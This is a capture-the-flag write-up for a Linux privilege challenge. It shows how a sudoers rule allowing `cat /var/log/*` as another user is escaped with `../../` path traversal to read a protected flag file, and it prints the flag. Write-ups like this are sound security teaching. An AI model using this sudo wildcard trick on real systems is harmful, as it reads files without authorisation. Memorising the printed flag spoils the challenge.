# Linux 5 – Super

## Challenge Description
This bot doesn’t look so important, it seems like he can do nothing… figure out how you can move on to the next user.

## Note
The Linux challenges are consecutive, starting from [part 1](../1%20-%20Lock%20and%20Key).

---
## Solution
First, we must log in to `bot5`, using the previous flag as the password, and then change directory to `bot5`'s home directory:
```
bot3@cybot01:~$ su bot5
Password: 
bot5@cybot01:/home/bot4$ cd ~
```

In the home directory, there is `flag.txt`. However, `bot5` does not have access to read the file; only `bot6` is allowed to. (I forgot to copy this part, but I used `ls -la` to see the permissions.)

Dang, this bot is almost as useless as I am. Luckily, we can use `sudo` to run things as other users.
```
$ sudo -u USERNAME
```

To see what we can do, we can use `sudo -ll`. The `-l` switch lists the current user's privileges, and `-ll` does the same but in a longer format.

```
bot5@cybot01:~$ sudo -ll
Matching Defaults entries for bot5 on cybot01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bot5 may run the following commands on cybot01:

Sudoers entry:
    RunAsUsers: bot6
    RunAsGroups: bot6
    Options: !authenticate
    Commands:
	/usr/bin/cat /var/log/*
```

We can see that we can run `/usr/bin/cat /var/log/*` as `bot6`.

Luckily for us, since they used a wildcard `*`, we can traverse the directories from `/var/log/` to reach our flag file:
```
bot5@cybot01:~$ sudo -u bot6 /usr/bin/cat /var/log/../../home/bot5/flag.txt 
CDDC21{b3w4r3sud03rz}
```

(Thanks a bunch to my teammate [@ThinkerPal](https://github.com/ThinkerPal/) who pointed out the `/../../` thing!)

### Flag:
```
CDDC21{b3w4r3sud03rz}
```

[< Part 4](../4%20-%20Line%20Inspection) | [Part 6 (by @ThinkerPal)](https://github.com/ThinkerPal/CTF-Writeups/tree/master/2021-02-CDDC/Linux%20Rules%20the%20World/6%20-%20Path%20to%20Win)
